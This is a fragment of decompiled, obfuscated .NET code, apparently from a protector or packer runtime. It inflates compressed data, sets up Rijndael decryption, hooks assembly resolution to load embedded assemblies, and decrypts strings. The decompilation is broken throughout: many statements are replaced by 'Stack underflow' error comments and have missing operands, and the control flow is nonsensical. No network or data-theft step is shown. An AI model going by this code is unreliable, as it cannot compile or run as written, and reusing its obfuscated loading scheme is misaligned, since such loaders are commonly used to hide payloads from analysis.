			//IL_0233: Incompatible stack heights: 0 vs 1
			//IL_0239: Incompatible stack heights: 0 vs 1
			//IL_023f: Incompatible stack heights: 0 vs 2
			void* ptr = stackalloc byte[12];
			while (true)
			{
				_0006._0001(((global::_0003._0004._0001)/*Error near IL_0014: Stack underflow*/)._0001);
				int num = (int)/*Error near IL_0221: Stack underflow*/;
				while (true)
				{
					IL_01fd:
					int num2 = num;
					int num3 = 258;
					while (true)
					{
						int num5;
						if (num2 >= num3)
						{
							int num4 = ((global::_0003._0004._0001)/*Error near IL_0032: Stack underflow*/)._0001;
							*(int*)(nint)/*Error near IL_0033: Stack underflow*/ = num4;
							int num6;
							int num7;
							switch (*(int*)(nint)/*Error near IL_0039: Stack underflow*/)
							{
							case 7:
								while (((num5 = _0006._0001(P_0._0001, P_0._0001)) & -256) == 0)
								{
									if (6u != 0)
									{
										_ = ((global::_0003._0004._0001)/*Error near IL_0062: Stack underflow*/)._0001;
										_0006._0001((global::_0003._0004._0003)/*Error near IL_006c: Stack underflow*/, (int)/*Error near IL_006c: Stack underflow*/);
										if (--num >= 258)
										{
											continue;
										}
									}
									goto IL_0078;
								}
								if (num5 < 257)
								{
									goto IL_00a3;
								}
								goto IL_00c6;
							case 8:
								if (P_0._0002 > 0)
								{
									P_0._0001 = 8;
									*(int*)((byte*)ptr + 4) = _0006._0001(P_0._0001, P_0._0002);
									if (*(int*)((byte*)ptr + 4) < 0)
									{
										return false;
									}
									if (false)
									{
										goto IL_00c6;
									}
									_0006._0001(P_0._0001, P_0._0002);
									P_0._0003 += *(int*)((byte*)ptr + 4);
								}
								P_0._0001 = 9;
								goto case 9;
							case 9:
								if (false)
								{
									goto end_IL_0203;
								}
								num5 = _0006._0001(P_0._0002, P_0._0001);
								if (num5 < 0)
								{
									goto IL_0163;
								}
								P_0._0004 = global::_0003._0004._0001._0003[num5];
								P_0._0002 = global::_0003._0004._0001._0004[num5];
								goto case 10;
							case 10:
								{
									num6 = P_0._0002;
									num7 = 0;
									goto IL_0186;
								}
								IL_01d3:
								_0006._0001(P_0._0001, P_0._0003, P_0._0004);
								num6 = num - P_0._0003;
								if (6u != 0)
								{
									num = num6;
									P_0._0001 = 7;
									break;
								}
								goto IL_01a9;
								IL_00c6:
								P_0._0003 = global::_0003._0004._0001._0001[num5 - 257];
								P_0._0002 = global::_0003._0004._0001._0002[num5 - 257];
								goto case 8;
								IL_0078:
								if (5u != 0)
								{
									return true;
								}
								goto IL_01a5;
								IL_0186:
								if (num6 > num7)
								{
									P_0._0001 = 10;
									*(int*)((byte*)ptr + 8) = _0006._0001(P_0._0001, P_0._0002);
									goto IL_01a5;
								}
								goto IL_01d3;
								IL_01a5:
								num6 = *(int*)((byte*)ptr + 8);
								goto IL_01a9;
								IL_01a9:
								num7 = 0;
								if (num7 != 0)
								{
									goto IL_0186;
								}
								if (num6 < num7)
								{
									return false;
								}
								_0006._0001(P_0._0001, P_0._0002);
								P_0._0004 += *(int*)((byte*)ptr + 8);
								goto IL_01d3;
							}
							goto IL_01fd;
						}
						return true;
						IL_00a3:
						num2 = num5;
						num3 = 0;
						if (num3 != 0)
						{
							continue;
						}
						goto IL_00ab;
						IL_0163:
						return false;
						continue;
						end_IL_0203:
						break;
					}
					break;
					IL_00ab:
					if (num2 < num3)
					{
						return false;
					}
					P_0._0002 = null;
					P_0._0001 = null;
					P_0._0001 = 2;
					return true;
				}
			}
		}

		static void _0001()
		{
			//IL_0017: Incompatible stack heights: 0 vs 1
			try
			{
				_ = AppDomain.CurrentDomain;
				ResolveEventHandler value = _0006._0001;
				((AppDomain)/*Error near IL_001e: Stack underflow*/).AssemblyResolve += value;
			}
			catch
			{
			}
		}

		static int _0001(global::_0003._0004._0002 P_0, int P_1)
		{
			//IL_0028: Invalid comparison between Unknown and I4
			//IL_009c: Unknown result type (might be due to invalid IL or missing references)
			//IL_00a2: Expected I4, but got Unknown
			//IL_00ce: Incompatible stack heights: 0 vs 1
			//IL_00d4: Incompatible stack heights: 0 vs 2
			//IL_00da: Incompatible stack heights: 0 vs 1
			//IL_00e0: Incompatible stack heights: 0 vs 2
			//IL_00e6: Incompatible stack heights: 0 vs 1
			//IL_00ec: Incompatible stack heights: 0 vs 1
			//IL_00f2: Incompatible stack heights: 0 vs 2
			//IL_00f8: Incompatible stack heights: 0 vs 2
			//IL_00fe: Incompatible stack heights: 0 vs 1
			while (true)
			{
				_ = ((global::_0003._0004._0002)/*Error near IL_000a: Stack underflow*/)._0003;
				if (/*Error near IL_0014: Stack underflow*/ >= /*Error near IL_0014: Stack underflow*/)
				{
					break;
				}
				_ = ((global::_0003._0004._0002)/*Error near IL_001e: Stack underflow*/)._0001;
				int num = ((global::_0003._0004._0002)/*Error near IL_0028: Stack underflow*/)._0002;
				if ((int)/*Error near IL_002a: Stack underflow*/ == num)
				{
					if (false)
					{
						break;
					}
					if (true)
					{
						return -1;
					}
				}
				else
				{
					if (7 == 0)
					{
						continue;
					}
					_ = ((global::_0003._0004._0002)/*Error near IL_0047: Stack underflow*/)._0001;
					_ = ((global::_0003._0004._0002)/*Error near IL_0051: Stack underflow*/)._0001;
					int num2 = ((global::_0003._0004._0002)/*Error near IL_0060: Stack underflow*/)._0001;
					((global::_0003._0004._0002)/*Error near IL_0069: Stack underflow*/)._0001 = num2 + 1;
					int num3 = (((byte[])/*Error near IL_006b: Stack underflow*/)[num2] & 0xFF) | ((P_0._0001[P_0._0001++] & 0xFF) << 8);
					int num4 = P_0._0003;
					_003F val = /*Error near IL_009d: Stack underflow*/| (num3 << num4);
					((global::_0003._0004._0002)/*Error near IL_00a2: Stack underflow*/)._0001 = (uint)(int)val;
				}
				P_0._0003 += 16;
				break;
			}
			long num5 = P_0._0001;
			int num6 = 1;
			while (true)
			{
				int num7;
				if (0 == 0)
				{
					num6 <<= P_1;
					if (false)
					{
						break;
					}
				}
				else if (num7 == 0)
				{
					continue;
				}
				num6--;
				break;
			}
			return (int)(num5 & num6);
		}

		static void _0001(int P_0, byte[] P_1, global::_0003._0004._0002 P_2, int P_3)
		{
			//IL_0017: Invalid comparison between Unknown and I4
			//IL_0029: Unknown result type (might be due to invalid IL or missing references)
			//IL_009e: Incompatible stack heights: 0 vs 1
			//IL_00a4: Incompatible stack heights: 0 vs 2
			//IL_00ae: Incompatible stack heights: 0 vs 1
			//IL_00b4: Incompatible stack heights: 0 vs 1
			//IL_00ba: Incompatible stack heights: 0 vs 1
			//IL_00c0: Expected I4, but got Unknown
			//IL_00c6: Incompatible stack heights: 0 vs 2
			//IL_00cc: Incompatible stack heights: 0 vs 1
			//IL_00d2: Incompatible stack heights: 0 vs 1
			int num2;
			if (true)
			{
				_ = ((global::_0003._0004._0002)/*Error near IL_000d: Stack underflow*/)._0001;
				int num = ((global::_0003._0004._0002)/*Error near IL_0017: Stack underflow*/)._0002;
				if ((int)/*Error near IL_0019: Stack underflow*/ < num)
				{
					new InvalidOperationException();
					throw /*Error near IL_001f: Stack underflow*/;
				}
				num2 = /*Error near IL_002a: Stack underflow*/+ /*Error near IL_002a: Stack underflow*/;
				_ = 0;
				if (/*Error near IL_0037: Stack underflow*/ > /*Error near IL_0037: Stack underflow*/|| /*Error near IL_0043: Stack underflow*/> /*Error near IL_0043: Stack underflow*/|| num2 > P_1.Length)
				{
					throw new ArgumentOutOfRangeException();
				}
				if ((P_3 & 1) == 0)
				{
					goto IL_0087;
				}
				P_2._0001 |= (uint)((P_1[P_0++] & 0xFF) << P_2._0003);
			}
			P_2._0003 += 8;
			goto IL_0087;
			IL_0087:
			P_2._0001 = P_1;
			P_2._0001 = P_0;
			P_2._0002 = num2;
		}

		static void _0001(global::_0003._0004._0003 P_0, int P_1, int P_2, int P_3)
		{
			//IL_001d: Unknown result type (might be due to invalid IL or missing references)
			//IL_0023: Expected I4, but got Unknown
			//IL_0064: Incompatible stack heights: 0 vs 1
			//IL_0067: Incompatible stack heights: 0 vs 2
			//IL_006a: Incompatible stack heights: 0 vs 1
			//IL_0070: Incompatible stack heights: 0 vs 1
			//IL_0073: Incompatible stack heights: 0 vs 1
			//IL_0076: Incompatible stack heights: 0 vs 1
			//IL_007a: Incompatible stack heights: 0 vs 2
			//IL_007d: Incompatible stack heights: 0 vs 1
			if (-1 == 0)
			{
				return;
			}
			while (true)
			{
				int num = P_2;
				int num2 = num - 1;
				if (2u != 0)
				{
					P_2 = num2;
					if (num <= 0 || 5 == 0)
					{
						break;
					}
					_ = ((global::_0003._0004._0003)/*Error near IL_000f: Stack underflow*/)._0001;
					int num3 = ((global::_0003._0004._0003)/*Error near IL_0018: Stack underflow*/)._0001;
					_003F val = /*Error near IL_001e: Stack underflow*/+ 1;
					((global::_0003._0004._0003)/*Error near IL_0023: Stack underflow*/)._0001 = (int)val;
					_ = ((global::_0003._0004._0003)/*Error near IL_002c: Stack underflow*/)._0001;
					P_1++;
					byte num4 = ((byte[])/*Error near IL_0033: Stack underflow*/)[/*Error near IL_0033: Stack underflow*/];
					((sbyte[])/*Error near IL_0034: Stack underflow*/)[/*Error near IL_0034: Stack underflow*/] = (sbyte)num4;
					int num5 = P_0._0001;
					((global::_0003._0004._0003)/*Error near IL_0047: Stack underflow*/)._0001 = num5 & 0x7FFF;
					num = P_1;
					if (3 == 0)
					{
						goto IL_0051;
					}
					num2 = 32767;
				}
				num &= num2;
				goto IL_0051;
				IL_0051:
				P_1 = num;
			}
		}

		static ResourceManager _0001()
		{
			//IL_003e: Incompatible stack heights: 0 vs 1
			//IL_0045: Incompatible stack heights: 0 vs 2
			//IL_004c: Incompatible stack heights: 0 vs 1
			//IL_0053: Incompatible stack heights: 0 vs 1
			while (4u != 0 && _0001._0001 == null)
			{
				if (3u != 0)
				{
					_009B(107396234);
					_ = _009C._007E_001C_0002;
					global::_009B._001B_0002(typeof(_0001).TypeHandle);
					/*Error near IL_004c: Stack underflow*/((object)/*Error near IL_004c: Stack underflow*/);
					new ResourceManager((string)/*Error near IL_0053: Stack underflow*/, (Assembly)/*Error near IL_0053: Stack underflow*/);
					_0001._0001 = (ResourceManager)/*Error near IL_0033: Stack underflow*/;
					break;
				}
			}
			return _0001._0001;
		}

		unsafe static int _0001(byte[] P_0, global::_0003._0004._0003 P_1, int P_2, int P_3)
		{
			//IL_0032: Invalid comparison between Unknown and I4
			//IL_005b: Unknown result type (might be due to invalid IL or missing references)
			//IL_005d: Unknown result type (might be due to invalid IL or missing references)
			//IL_0063: Unknown result type (might be due to invalid IL or missing references)
			//IL_0065: Expected I4, but got Unknown
			//IL_007e: Incompatible stack heights: 1 vs 2
			//IL_0080: Invalid comparison between Unknown and I4
			//IL_00a1: Incompatible stack heights: 1 vs 2
			//IL_00a2: Unknown result type (might be due to invalid IL or missing references)
			//IL_00a5: Expected I4, but got Unknown
			//IL_00d2: Incompatible stack heights: 1 vs 2
			//IL_00d3: Invalid comparison between Unknown and I4
			//IL_00e7: Incompatible stack heights: 0 vs 1
			//IL_00ed: Incompatible stack heights: 0 vs 1
			//IL_00f3: Incompatible stack heights: 0 vs 1
			//IL_00f9: Incompatible stack heights: 0 vs 1
			//IL_00ff: Incompatible stack heights: 0 vs 1
			//IL_0105: Incompatible stack heights: 0 vs 1
			//IL_010b: Incompatible stack heights: 0 vs 1
			//IL_0111: Incompatible stack heights: 0 vs 2
			void* ptr = stackalloc byte[12];
			int num2;
			while (true)
			{
				int num = ((global::_0003._0004._0003)/*Error near IL_0019: Stack underflow*/)._0001;
				*(int*)(nint)/*Error near IL_001a: Stack underflow*/ = num;
				num2 = ((global::_0003._0004._0003)/*Error near IL_0029: Stack underflow*/)._0002;
				if (1 == 0)
				{
					break;
				}
				if (6u != 0)
				{
					if ((int)/*Error near IL_0034: Stack underflow*/ > num2)
					{
						P_3 = ((global::_0003._0004._0003)/*Error near IL_003e: Stack underflow*/)._0002;
					}
					else
					{
						_ = ((global::_0003._0004._0003)/*Error near IL_0051: Stack underflow*/)._0001;
						int num3 = ((global::_0003._0004._0003)/*Error near IL_005b: Stack underflow*/)._0002;
						_003F val = /*Error near IL_005c: Stack underflow*/- num3;
						*(int*)(nint)/*Error near IL_0065: Stack underflow*/ = (val + P_3) & 0x7FFF;
					}
					*(int*)((byte*)ptr + 4) = P_3;
					if (false)
					{
						continue;
					}
					if (0 == 0)
					{
						*(int*)((byte*)ptr + 8) = P_3 - *(int*)ptr;
						_ = *(int*)((byte*)ptr + 8);
						if (false)
						{
							goto IL_00a2;
						}
						if ((int)/*Error near IL_0082: Stack underflow*/ <= num2)
						{
							goto IL_00a9;
						}
						Array.Copy(P_1._0001, 32768 - *(int*)((byte*)ptr + 8), P_0, P_2, *(int*)((byte*)ptr + 8));
					}
					_ = *(int*)((byte*)ptr + 8);
				}
				goto IL_00a2;
				IL_00a2:
				P_2 = /*Error near IL_00a3: Stack underflow*/+ num2;
				P_3 = *(int*)ptr;
				goto IL_00a9;
				IL_00a9:
				Array.Copy(P_1._0001, *(int*)ptr - P_3, P_0, P_2, P_3);
				P_1._0002 -= *(int*)((byte*)ptr + 4);
				_ = P_1._0002;
				_ = 0;
				break;
			}
			if ((int)/*Error near IL_00d5: Stack underflow*/ < num2)
			{
				throw new InvalidOperationException();
			}
			return *(int*)((byte*)ptr + 4);
		}

		static int _0001(global::_0003._0004._0003 P_0)
		{
			//IL_0009: Incompatible stack heights: 0 vs 1
			return ((global::_0003._0004._0003)/*Error near IL_0007: Stack underflow*/)._0002;
		}

		static ICryptoTransform _0001(bool P_0, byte[] P_1, byte[] P_2)
		{
			//IL_0020: Incompatible stack heights: 0 vs 1
			//IL_002c: Incompatible stack heights: 0 vs 1
			//IL_002f: Incompatible stack heights: 0 vs 1
			//IL_0032: Incompatible stack heights: 0 vs 1
			//IL_0035: Incompatible stack heights: 0 vs 1
			//IL_003c: Incompatible stack heights: 0 vs 1
			//IL_003f: Incompatible stack heights: 0 vs 1
			//IL_0042: Incompatible stack heights: 0 vs 1
			//IL_005b: Incompatible stack heights: 0 vs 1
			new RijndaelManaged();
			SymmetricAlgorithm symmetricAlgorithm = (SymmetricAlgorithm)/*Error near IL_0061: Stack underflow*/;
			try
			{
				ICryptoTransform result;
				while (true)
				{
					if (0 == 0 && (int)/*Error near IL_000e: Stack underflow*/ == 0)
					{
						if (false)
						{
							continue;
						}
						((SymmetricAlgorithm)/*Error near IL_003c: Stack underflow*/).CreateEncryptor((byte[])/*Error near IL_003c: Stack underflow*/, (byte[]?)/*Error near IL_003c: Stack underflow*/);
						goto IL_0025;
					}
					goto IL_001f;
					IL_0025:
					result = (ICryptoTransform)/*Error near IL_0026: Stack underflow*/;
					if (3 == 0)
					{
						goto IL_001f;
					}
					break;
					IL_001f:
					((SymmetricAlgorithm)/*Error near IL_0025: Stack underflow*/).CreateDecryptor((byte[])/*Error near IL_0025: Stack underflow*/, P_2);
					goto IL_0025;
				}
				return result;
			}
			finally
			{
				if (6u != 0 && symmetricAlgorithm != null && 0 == 0)
				{
					((IDisposable)symmetricAlgorithm).Dispose();
				}
			}
		}

		static _0006()
		{
			//IL_000f: Incompatible stack heights: 0 vs 1
			_ = typeof(_0006);
			Strings.CreateGetStringDelegate((Type)/*Error near IL_0016: Stack underflow*/);
		}
	}
}
namespace _0003
{
	[CompilerGenerated]
	internal sealed class _0005
	{
		[StructLayout(LayoutKind.Explicit, Pack = 1, Size = 12)]
		private struct _0001
		{
		}

		[StructLayout(LayoutKind.Explicit, Pack = 1, Size = 16)]
		internal struct _0002
		{
		}

		[StructLayout(LayoutKind.Explicit, Pack = 1, Size = 76)]
		private struct _0003
		{
		}

		[StructLayout(LayoutKind.Explicit, Pack = 1, Size = 116)]
		private struct _0004
		{
		}

		[StructLayout(LayoutKind.Explicit, Pack = 1, Size = 120)]
		private struct _0005
		{
		}

		internal static readonly long _0001/* Not supported: data(A4 D7 C3 83 58 BB 23 5D) */;

		internal static readonly long _0002/* Not supported: data(D7 40 1C 81 66 DB 88 EF) */;

		internal static readonly _0002 _0001/* Not supported: data(02 02 02 02 02 02 02 02 02 02 02 02 02 02 02 02) */;

		internal static readonly _0004 _0001/* Not supported: data(03 00 00 00 04 00 00 00 05 00 00 00 06 00 00 00 07 00 00 00 08 00 00 00 09 00 00 00 0A 00 00 00 0B 00 00 00 0D 00 00 00 0F 00 00 00 11 00 00 00 13 00 00 00 17 00 00 00 1B 00 00 00 1F 00 00 00 23 00 00 00 2B 00 00 00 33 00 00 00 3B 00 00 00 43 00 00 00 53 00 00 00 63 00 00 00 73 00 00 00 83 00 00 00 A3 00 00 00 C3 00 00 00 E3 00 00 00 02 01 00 00) */;

		internal static readonly _0001 _0001/* Not supported: data(02 00 00 00 03 00 00 00 07 00 00 00) */;

		internal static readonly _0002 _0002/* Not supported: data(00 08 04 0C 02 0A 06 0E 01 09 05 0D 03 0B 07 0F) */;

		internal static readonly _0005 _0001/* Not supported: data(00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 01 00 00 00 01 00 00 00 02 00 00 00 02 00 00 00 03 00 00 00 03 00 00 00 04 00 00 00 04 00 00 00 05 00 00 00 05 00 00 00 06 00 00 00 06 00 00 00 07 00 00 00 07 00 00 00 08 00 00 00 08 00 00 00 09 00 00 00 09 00 00 00 0A 00 00 00 0A 00 00 00 0B 00 00 00 0B 00 00 00 0C 00 00 00 0C 00 00 00 0D 00 00 00 0D 00 00 00) */;

		internal static readonly _0003 _0001/* Not supported: data(10 00 00 00 11 00 00 00 12 00 00 00 00 00 00 00 08 00 00 00 07 00 00 00 09 00 00 00 06 00 00 00 0A 00 00 00 05 00 00 00 0B 00 00 00 04 00 00 00 0C 00 00 00 03 00 00 00 0D 00 00 00 02 00 00 00 0E 00 00 00 01 00 00 00 0F 00 00 00) */;

		internal static readonly _0002 _0003/* Not supported: data(01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01) */;

		internal static readonly _0001 _0002/* Not supported: data(03 00 00 00 03 00 00 00 0B 00 00 00) */;

		internal static readonly _0004 _0002/* Not supported: data(00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 01 00 00 00 01 00 00 00 01 00 00 00 01 00 00 00 02 00 00 00 02 00 00 00 02 00 00 00 02 00 00 00 03 00 00 00 03 00 00 00 03 00 00 00 03 00 00 00 04 00 00 00 04 00 00 00 04 00 00 00 04 00 00 00 05 00 00 00 05 00 00 00 05 00 00 00 05 00 00 00 00 00 00 00) */;

		internal static readonly _0005 _0002/* Not supported: data(01 00 00 00 02 00 00 00 03 00 00 00 04 00 00 00 05 00 00 00 07 00 00 00 09 00 00 00 0D 00 00 00 11 00 00 00 19 00 00 00 21 00 00 00 31 00 00 00 41 00 00 00 61 00 00 00 81 00 00 00 C1 00 00 00 01 01 00 00 81 01 00 00 01 02 00 00 01 03 00 00 01 04 00 00 01 06 00 00 01 08 00 00 01 0C 00 00 01 10 00 00 01 18 00 00 01 20 00 00 01 30 00 00 01 40 00 00 01 60 00 00) */;
	}
}
